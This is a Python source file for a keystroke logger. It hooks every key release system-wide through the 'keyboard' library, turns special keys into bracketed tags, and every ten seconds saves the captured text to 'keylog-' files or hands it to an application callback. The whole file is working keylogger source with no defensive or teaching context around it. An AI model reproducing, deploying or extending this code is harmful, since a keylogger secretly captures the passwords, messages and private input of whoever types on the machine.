import keyboard
from threading import Timer
from datetime import datetime
import time

class KeyboardLogger():
    def __init__(self, interval, report_method='file'):
        self.interval = interval
        self.report_method = report_method
        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
    
    def callback(self,event):
        name = event.name
        if(len(name)>1):
            #def missed some here, ctrl for example
            if name == 'space':
                name = ' '
            elif name == 'enter':
                name = '[ENTER]\n'
            elif name=='decimal':
                name = '.'
            else:
                name = name.replace(" ","_")
                name = f"[{name.upper()}]"
        self.log += name

    def report_to_file(self):
        with open(f"{self.filename}.txt","w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
     
    def update_filename(self):
        start_dt_str = str(self.start_dt)[:7].replace(" ","-").replace(":","")
        end_dt_str = str(self.end_dt)[:7].replace(" ","-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def set_app_update_func(self, f):
        self.update_kb_log = f

    def send_log_to_app(self):
        self.update_kb_log()

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            if self.report_method=='file':    
                self.update_filename()
                self.report_to_file()
            elif self.report_method=='app':
                self.send_log_to_app()

            self.start_dt = datetime.now()
            
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()
        self.log = ''
    
    def report_to_app(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_kb_log()
            self.log = ''

    def start(self):
        self.start_dt = datetime.now()
        #keyboard.hook(self.callback)
        keyboard.on_release(callback=self.callback)
        self.report()
        if self.report_method=='app':
            time.sleep(1) 
        
        elif self.report_method=='file':
            keyboard.wait()

if __name__=='__main__':
    KL = KeyboardLogger(interval=10)
    KL.start()
